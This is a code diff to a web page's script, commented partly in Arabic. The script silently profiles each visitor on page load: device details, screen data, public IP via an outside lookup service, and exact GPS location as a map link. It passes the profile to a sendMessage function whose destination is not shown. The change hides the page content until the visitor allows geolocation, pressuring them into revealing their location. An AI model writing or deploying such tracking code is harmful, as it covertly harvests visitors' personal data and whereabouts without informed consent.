@@ -112,51 +112,55 @@
 
       // إرسال رسالة عند دخول المستخدم
       async function sendEntryMessage() {
-        try {
-          let message = '👤 دخل مستخدم جديد إلى الموقع! 👤\n';
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(async function(position) {
+            try {
+              let message = '👤 A new user has entered the site! 👤\n';
 
-          // معلومات الجهاز
-          message += `\n📱 معلومات الجهاز 📱:\n`;
-          message += `- اسم الجهاز: ${getDeviceName()}\n`; // محاولة الحصول على اسم الجهاز
-          message += `- User Agent: ${navigator.userAgent}\n`;
-          message += `- Platform: ${navigator.platform}\n`;
-          message += `- Language: 🗣️ ${navigator.language}\n`;
-          message += `- Online: 🌐 ${navigator.onLine ? '✅' : '❌'}\n`;
-          message += `- Cookies Enabled: 🍪 ${navigator.cookieEnabled ? '✅' : '❌'}\n`;
-          message += `- Device Type: ${getDeviceType()}\n`;
+              // Device Information
+              message += `\n📱 Device Information 📱:\n`;
+              message += `- Device Name: ${getDeviceName()}\n`;
+              message += `- User Agent: ${navigator.userAgent}\n`;
+              message += `- Platform: ${navigator.platform}\n`;
+              message += `- 🗣 Language: ${navigator.language}\n`;
+              message += `- 🌐 Online: ${navigator.onLine ? 'Yes' : 'No'}\n`;
+              message += `- 🍪 Cookies Enabled: ${navigator.cookieEnabled ? 'Yes' : 'No'}\n`;
+              message += `- Device Type: ${getDeviceType()}\n`;
 
-          // معلومات الشاشة
-          message += `\n🖥️ معلومات الشاشة 🖥️:\n`;
-          message += `- Width: ${screen.width}\n`;
-          message += `- Height: ${screen.height}\n`;
-          message += `- Color Depth: ${screen.colorDepth}\n`;
-          message += `- Pixel Depth: ${screen.pixelDepth}\n`;
+              // Screen Information
+              message += `\n🖥️ Screen Information 🖥️:\n`;
+              message += `- Width: ${screen.width}\n`;
+              message += `- Height: ${screen.height}\n`;
+              message += `- Color Depth: ${screen.colorDepth}\n`;
+              message += `- Pixel Depth: ${screen.pixelDepth}\n`;
 
-          // محاولة الحصول على عنوان IP
-          const ipResponse = await fetch('https://api.ipify.org?format=json');
-          if (ipResponse.ok) {
-            const ipData = await ipResponse.json();
-            message += `\n🌐 IP: ${ipData.ip}`;
-          }
+              // IP Address
+              const ipResponse = await fetch('https://api.ipify.org?format=json');
+              if (ipResponse.ok) {
+                const ipData = await ipResponse.json();
+                message += `\n🌐 IP: ${ipData.ip}`;
+              }
 
-          // الحصول على الموقع (يطلب إذن)
-          if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(function(position) {
+              // Location
               const latitude = position.coords.latitude;
               const longitude = position.coords.longitude;
               const googleMapsLink = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
-              message += `\n📍 الموقع: ${googleMapsLink}`;
-              sendMessage(message);
-            }, function(error) {
-              console.error('Error getting location:', error);
-              sendMessage(message);
-            });
-          } else {
-            sendMessage(message);
-          }
+              message += `\n📍 Location: ${googleMapsLink}`;
 
-        } catch (err) {
-          console.error('حدث خطأ: ', err);
+              sendMessage(message);
+
+              // إظهار المحتوى بعد الحصول على الإذن
+              document.body.style.display = 'block';
+
+            } catch (err) {
+              console.error('Error:', err);
+            }
+          }, function(error) {
+            console.error('Error getting location:', error);
+          });
+        } else {
+          // لا يتم دعم الموقع
+          console.error('Geolocation is not supported.');
         }
       }
 
@@ -206,6 +210,9 @@
           console.error('حدث خطأ: ', err);
         }
       }
+
+      // إخفاء المحتوى حتى الحصول على الإذن
+      document.body.style.display = 'none';
 
       sendEntryMessage();
     </script>
